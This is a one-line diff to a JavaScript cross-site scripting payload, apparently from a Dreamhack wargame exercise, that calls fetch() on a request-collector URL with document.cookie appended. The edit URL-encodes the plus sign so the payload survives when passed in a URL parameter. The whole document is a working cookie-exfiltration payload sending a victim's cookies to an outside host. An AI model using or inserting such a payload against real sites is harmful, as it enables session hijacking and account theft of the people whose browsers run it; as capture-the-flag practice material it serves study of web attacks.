@@ -1,1 +1,1 @@
-fetch('https://zxzhncm.request.dreamhack.games/'+document.cookie);
+fetch('https://zxzhncm.request.dreamhack.games/'%2bdocument.cookie);
